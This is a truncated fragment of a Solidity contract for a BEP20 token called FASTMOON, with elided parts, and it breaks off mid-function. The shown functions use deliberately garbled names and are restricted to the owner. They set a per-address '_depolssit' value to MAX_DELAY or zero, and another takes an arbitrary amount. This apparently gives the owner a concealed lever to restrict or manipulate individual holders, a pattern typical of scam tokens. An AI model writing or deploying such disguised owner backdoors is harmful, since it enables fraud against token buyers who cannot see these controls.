...
contract FASTMOON is IBEP20, HasForeignAsset {
    ...
    function getFastMoon35252ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setFastMoon35252reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupFastMoon35252ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupFastMoon35252Aasses(address booadndd,uint256 nuum) public onlyOwner {
